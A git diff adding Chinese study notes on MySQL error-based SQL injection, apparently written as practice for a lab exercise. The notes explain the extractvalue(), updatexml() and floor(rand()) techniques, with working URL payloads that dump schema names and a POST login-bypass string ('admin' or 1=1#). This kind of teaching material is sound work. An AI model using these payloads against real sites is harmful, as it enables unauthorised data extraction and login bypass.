@@ -77,3 +77,48 @@ select extractvalue(doc,'/book/title') from xml;
 
 select extractvalue(doc,'~book/title') from xml；
 
+extractvalue()报错一次最多显示32个字符，使用substr()拼接
+
+示例：
+
+?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select substr(**group_concat(schema_name)**,1,30) **from information_schema.schemata**)))--+
+
+## upadtexml()
+报错原理：
+
+select updatexml(doc,'/book/tittle/','1')from xml;
+
+↓
+
+select updatexml(doc,'~book/tittle','1')from xml;
+
+同extractvalue(),使用substr()拼接
+
+示例：
+
+?id=-1' union select 1,2,updatexml(1,concat(0x7e,(select substr(**group_concat(schema_name)**,1,30) **from information_schema.schemata**)),3)--+
+
+## floor()
+
+select count(*),concat_ws('-',(select database()),floor(rand(0)2)) as a from users group by a; //固定报错，显示报错信息；
+1. rand(0) 的确定性：当给 rand() 指定种子参数(如0)时，它会生成可预测的伪随机序列
+2. floor() 取整：floor(rand(0)*2) 会将结果转换为0或1
+3. GROUP BY 冲突：在分组操作时，MySQL会多次计算这个值，导致临时表中出现主键冲突
+
+示例：
+
+?id=-1' union select 1,count(*),concat_ws('-',**(select substr(group_concat(schema_name),1,31) from information_schema.schemata)**,floor(rand(0)*2)) as a from information_schema.tables group by a--+
+
+> information_schema.tables是数据库中一定存在的表，用作计数，不用于查询
+
+# POST提交注入
+
+username:admin' or 1=1#
+
+password:123
+
+示例：
+ 
+uname=' union select 1,group_concat(schema_name) from information_schema.schemata#&passwd=123&Submit=Submit
+
+
